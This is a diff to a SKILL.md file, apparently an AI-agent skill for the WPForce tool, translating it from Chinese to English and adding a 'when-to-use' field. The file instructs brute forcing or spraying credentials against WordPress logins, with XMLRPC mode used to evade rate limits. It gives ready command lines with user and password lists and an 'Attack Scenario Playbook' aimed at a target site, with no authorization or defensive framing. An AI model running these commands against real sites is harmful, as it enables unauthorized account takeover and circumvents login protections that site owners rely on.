@@ -2,37 +2,39 @@
 name: wpforce-login
 description: "WPForce: WP backend brute force. Signals: brute force, password spraying, WP login brute force, threads, XMLRPC mode."
 zh-signals: "WPForce: WP 后台爆破。信号:暴力破解,口令喷射,WP 登录爆破,线程,XMLRPC 模式。"
+when-to-use: >-
+  Use to brute force or spray credentials against a WordPress login page, optionally via XMLRPC to submit multiple credentials per request and evade rate limits.
 ---
 
 # WPForce
 
-- 攻击大类:C28 暴力破解与口令喷射
-- 上游仓库:https://github.com/n00py/WPForce
-- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C28 Brute Force and Password Spraying
+- Upstream Repository: https://github.com/n00py/WPForce
+- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/n00py/WPForce
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python wpforce.py -u https://t.com -w users.txt -p pass.txt` | WP 登录爆破 |
-| `-u url -w u.txt -p p.txt -t 20` | 线程 |
-| `--xmlrpc` | XMLRPC 模式 |
+| `python wpforce.py -u https://t.com -w users.txt -p pass.txt` | WP login brute force |
+| `-u url -w u.txt -p p.txt -t 20` | Threads |
+| `--xmlrpc` | XMLRPC mode |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### WP 后台爆破
+### WP backend brute force
 
 ```bash
 python wpforce.py -u https://t.com -w users.txt -p top100.txt
-# xmlrpc 多线程绕过登录限制
+# xmlrpc multi-threaded mode bypasses login rate limits
 ```
 
-## 注意事项
+## Notes
 
-WordPress 登录爆破,XMLRPC 模式支持单请求多凭据。
+WordPress login brute force; XMLRPC mode supports submitting multiple credentials per request.
